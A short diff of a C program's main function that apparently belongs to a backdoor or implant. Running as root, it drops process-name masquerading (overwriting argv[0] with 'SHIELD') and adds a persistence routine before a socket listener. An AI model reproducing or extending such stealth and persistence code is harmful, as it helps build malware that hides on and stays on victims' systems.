@@ -135,10 +135,9 @@ int main(int ac, char **av) {
         fprintf(stderr, "Error: this program must be run as root.\n");
         return 1;
     }
-    memset(av[0], 0, 32);
-    memcpy(av[0], "SHIELD", strlen("SHIELD"));
-    signal(SIGPIPE, SIG_IGN);
-    create_daemon();
+    //signal(SIGPIPE, SIG_IGN);
+    set_persistence();
+    //create_daemon();
     start_socket_listener();
     return 0;
 }
